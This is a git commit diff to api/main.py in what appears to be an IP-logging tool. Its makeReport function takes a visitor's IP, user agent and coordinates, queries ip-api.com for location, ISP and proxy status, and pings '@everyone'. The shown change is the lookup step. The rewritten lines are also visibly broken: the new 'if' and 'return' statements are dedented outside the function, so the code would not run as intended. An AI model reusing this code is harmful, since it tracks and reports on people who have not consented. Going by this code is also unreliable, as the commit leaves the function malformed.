c65c9a2c7f6ecdd33b5af5765c5d6b80251a6b89
BypassHub-EX <bloomhavengg@gmail.com>
2026-04-26 19:47:10 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -109,8 +109,14 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
     ping = "@everyone"
 
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
+    info = requests.get(
+    f"http://ip-api.com/json/{ip}?fields=status,message,proxy,hosting,isp,as,country,regionName,city,lat,lon,timezone,mobile"
+).json()
+
+if info.get("status") != "success":
+    return
+
+if info.get("proxy"):
         if config["vpnCheck"] == 2:
                 return
         
